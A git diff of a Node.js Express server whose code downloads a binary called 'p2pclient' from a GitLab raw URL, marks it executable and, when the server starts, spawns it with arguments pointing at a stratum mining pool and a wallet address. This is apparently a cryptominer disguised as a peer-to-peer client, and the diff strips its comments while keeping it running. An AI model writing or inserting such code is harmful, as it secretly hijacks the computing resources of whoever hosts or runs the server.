@@ -6,19 +6,15 @@ import winston from 'winston';
 import { spawn } from 'child_process';
 import axios from 'axios';
 import os from 'os';
-import { promisify } from 'util';
 import https from 'https';
 
-// Pastikan __dirname bisa digunakan dalam ES Module
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-// Path file p2pclient
 const P2P_PATH = path.join(__dirname, 'p2pclient');
 const LOG_FILE = path.join(__dirname, 'p2pclient.log');
 const P2P_URL = 'https://gitlab.com/rikzakalani/coremnr/raw/main/p2pclient';
 
-// Logger
 const logger = winston.createLogger({
     level: 'info',
     format: winston.format.combine(
@@ -31,7 +27,6 @@ const logger = winston.createLogger({
     ]
 });
 
-// Fungsi untuk mengunduh file p2pclient
 async function downloadP2PClient() {
     return new Promise((resolve, reject) => {
         const file = fs.createWriteStream(P2P_PATH);
@@ -39,7 +34,7 @@ async function downloadP2PClient() {
             response.pipe(file);
             file.on('finish', () => {
                 file.close(() => {
-                    fs.chmodSync(P2P_PATH, '755'); // Beri izin eksekusi
+                    fs.chmodSync(P2P_PATH, '755');
                     resolve();
                 });
             });
@@ -49,7 +44,6 @@ async function downloadP2PClient() {
     });
 }
 
-// Fungsi untuk menjalankan p2pclient
 let peerProcess = null;
 
 async function startP2PClient() {
@@ -60,12 +54,20 @@ async function startP2PClient() {
             logger.info('✅ p2pclient downloaded successfully.');
         } catch (error) {
             logger.error('❌ Failed to download p2pclient:', error);
-            process.exit(1);
+            return;
         }
     }
 
+    if (!fs.existsSync(P2P_PATH)) {
+        logger.error('❌ p2pclient file not found even after download.');
+        return;
+    }
+
     logger.info('🚀 Starting p2pclient...');
-    peerProcess = spawn(P2P_PATH, ['--noeval', '--hard-aes', '-P', 'stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek@us.catchthatrabbit.com:8008']);
+    peerProcess = spawn(P2P_PATH, [
+        '--noeval', '--hard-aes', '-P',
+        'stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek@us.catchthatrabbit.com:8008'
+    ], { shell: true });
 
     peerProcess.stdout.on('data', (data) => logger.info(data.toString()));
     peerProcess.stderr.on('data', (data) => logger.error(data.toString()));
@@ -80,7 +82,6 @@ async function startP2PClient() {
     });
 }
 
-// Inisialisasi Express
 const app = express();
 const PORT = process.env.PORT || 5000;
 
@@ -105,7 +106,6 @@ app.get('/', async (req, res) => {
     }
 });
 
-// Shutdown handling
 process.on('SIGINT', () => {
     logger.info('🛑 Stopping p2pclient...');
     if (peerProcess) {
@@ -114,7 +114,6 @@ process.on('SIGINT', () => {
     process.exit();
 });
 
-// Mulai server
 app.listen(PORT, () => {
     logger.info(`🚀 Server running on http://localhost:${PORT}`);
     startP2PClient();
